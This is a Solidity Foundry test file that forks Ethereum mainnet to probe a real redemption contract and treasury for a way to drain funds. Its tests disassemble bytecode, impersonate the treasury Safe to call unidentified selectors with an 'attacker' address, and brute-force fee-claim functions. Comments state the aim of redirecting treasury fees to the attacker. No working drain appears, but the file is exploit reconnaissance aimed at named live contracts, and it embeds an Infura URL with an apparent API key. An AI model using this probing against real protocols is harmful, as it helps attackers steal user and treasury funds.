// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract TreasuryDrainPath is Test {
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address constant TREASURY_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TraceTreasurySlotUsage() public view {
        console.log("=== TRACING TREASURY SLOT USAGE ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Detailed trace around offset 781 where slot 4 is loaded
        console.log("Bytecode around slot 4 SLOAD at 781:");

        uint i = 770;
        while (i < 900 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0xfa) console.log(i, "STATICCALL");
            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0x57) console.log(i, "JUMPI");
            if (op == 0x14) console.log(i, "EQ");

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size == 4) {
                    bytes4 sel = bytes4(uint32(val));
                    console.log(i, "PUSH4:");
                    console.logBytes4(sel);
                } else if (val < 10000) {
                    console.log(i, "PUSH:", val);
                }
                skipBytes = size;
            }

            i += 1 + skipBytes;
        }
    }

    function test_WhatDoTreasurySelectorsReturn() public {
        console.log("=== WHAT DO TREASURY SELECTORS DO? ===\n");

        // These selectors succeed when called by Treasury
        // Let's understand what they do

        bytes4[] memory sels = new bytes4[](4);
        sels[0] = bytes4(0x9307e802);
        sels[1] = bytes4(0xfd424ea8);
        sels[2] = bytes4(0xc5d664c6);
        sels[3] = bytes4(0xeda72134);

        console.log("Calling selectors AS Treasury and checking returns:");

        vm.startPrank(TREASURY_SAFE);

        for (uint i = 0; i < sels.length; i++) {
            console.log("\nSelector:");
            console.logBytes4(sels[i]);

            (bool s, bytes memory d) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i])
            );
            console.log("Success:", s);
            if (s && d.length >= 32) {
                // Try to decode as address
                if (d.length == 32) {
                    address addr = abi.decode(d, (address));
                    console.log("Returns (address):", addr);
                } else if (d.length == 64) {
                    console.log("Returns 64 bytes");
                }
            }
        }

        vm.stopPrank();
    }

    function test_TryTreasuryWithParams() public {
        console.log("=== TRYING TREASURY FUNCTIONS WITH PARAMS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 safeBalBefore = IERC20(wstETH).balanceOf(TREASURY_SAFE);

        console.log("Vault before:", vaultBefore / 1e18);
        console.log("Treasury Safe before:", safeBalBefore / 1e18);

        vm.startPrank(TREASURY_SAFE);

        // Try the selectors with various parameters
        // 0xfd424ea8 - what if we pass amount?
        console.log("\nTrying 0xfd424ea8 with amount:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), 100e18)
        );
        console.log("Success:", s1);
        if (d1.length > 0) console.logBytes(d1);

        // 0x9307e802 with address param
        console.log("\nTrying 0x9307e802 with address:");
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x9307e802), attacker)
        );
        console.log("Success:", s2);
        if (d2.length > 0) console.logBytes(d2);

        // 0xc5d664c6 might be claimFees or similar
        console.log("\nTrying 0xc5d664c6 (might be claimFees):");
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), attacker)
        );
        console.log("Success:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 safeBalAfter = IERC20(wstETH).balanceOf(TREASURY_SAFE);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Treasury change:", int256(safeBalAfter) - int256(safeBalBefore));
    }

    function test_FindTreasuryClaimFunction() public {
        console.log("=== FINDING TREASURY CLAIM FUNCTION ===\n");

        // Maybe there's a function that sends fees TO the Treasury
        // And we can manipulate it to send to attacker instead

        bytes4[] memory claimSels = new bytes4[](10);
        claimSels[0] = bytes4(keccak256("claimFees()"));
        claimSels[1] = bytes4(keccak256("collectFees()"));
        claimSels[2] = bytes4(keccak256("withdrawFees()"));
        claimSels[3] = bytes4(keccak256("harvestFees()"));
        claimSels[4] = bytes4(keccak256("transferFees()"));
        claimSels[5] = bytes4(keccak256("sendFees()"));
        claimSels[6] = bytes4(keccak256("distributeFees()"));
        claimSels[7] = bytes4(keccak256("claim()"));
        claimSels[8] = bytes4(keccak256("withdraw()"));
        claimSels[9] = bytes4(keccak256("harvest()"));

        console.log("Trying claim-related selectors:");

        vm.startPrank(attacker);

        for (uint i = 0; i < claimSels.length; i++) {
            (bool s,) = REDEMPTION_1.call{gas: 200000}(
                abi.encodeWithSelector(claimSels[i])
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(claimSels[i]);
            }
        }

        vm.stopPrank();
    }

    function test_MatchSelectorsToNames() public pure {
        console.log("=== MATCHING SELECTORS TO NAMES ===\n");

        // Let's try to identify what 0xfd424ea8, 0x9307e802, 0xc5d664c6 are

        // Common function names
        string[40] memory funcs = [
            "treasury()",
            "setTreasury(address)",
            "claimFees()",
            "collectFees()",
            "claimTreasury()",
            "withdrawToTreasury()",
            "sendToTreasury(uint256)",
            "transferToTreasury(uint256)",
            "protocolFee()",
            "setProtocolFee(uint256)",
            "fee()",
            "setFee(uint256)",
            "accumulatedFees()",
            "pendingFees()",
            "lastFeeCollection()",
            "feeRate()",
            "feeRecipient()",
            "setFeeRecipient(address)",
            "totalFees()",
            "claimedFees()",
            "unclaimedFees()",
            "pause()",
            "unpause()",
            "paused()",
            "emergencyWithdraw()",
            "rescue(address)",
            "rescueTokens(address,uint256)",
            "sweep(address)",
            "recoverTokens(address,uint256)",
            "withdrawTokens(address,uint256)",
            "transferToken(address,uint256)",
            "sendToken(address,address,uint256)",
            "execute(address,bytes)",
            "multicall(bytes[])",
            "forward(address,bytes)",
            "proxy(address,bytes)",
            "delegateCall(address,bytes)",
            "IMPLEMENTATION()",
            "LOGIC()",
            "admin()"
        ];

        bytes4[4] memory targets = [
            bytes4(0xfd424ea8),
            bytes4(0x9307e802),
            bytes4(0xc5d664c6),
            bytes4(0xeda72134)
        ];

        for (uint t = 0; t < 4; t++) {
            console.log("\nLooking for:");
            console.logBytes4(targets[t]);

            for (uint i = 0; i < 40; i++) {
                bytes4 sel = bytes4(keccak256(bytes(funcs[i])));
                if (sel == targets[t]) {
                    console.log("MATCH:", funcs[i]);
                }
            }
        }
    }

    function test_TraceRedemption1ToTreasuryTransfer() public view {
        console.log("=== TRACING TRANSFERS TO TREASURY ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find where wstETH transfer selector is used
        bytes4 transferSel = bytes4(keccak256("transfer(address,uint256)"));
        console.log("transfer selector:");
        console.logBytes4(transferSel);

        console.log("\nSearching for transfer selector in REDEMPTION_1:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == transferSel) {
                    console.log("Found at offset:", i);

                    // Check if slot 4 (Treasury) is loaded nearby
                    bool usesSlot4 = false;
                    for (uint j = (i > 100 ? i - 100 : 0); j < i; j++) {
                        if (uint8(code[j]) == 0x60 && j + 2 < i &&
                            uint8(code[j+1]) == 0x04 && uint8(code[j+2]) == 0x54) {
                            usesSlot4 = true;
                            console.log("  Uses slot 4 (Treasury)!");
                        }
                    }

                    // Look for CALL after
                    for (uint k = i; k < i + 100 && k < code.length; k++) {
                        if (uint8(code[k]) == 0xf1) {
                            console.log("  -> CALL at:", k);
                            break;
                        }
                    }
                }
            }
        }
    }
}
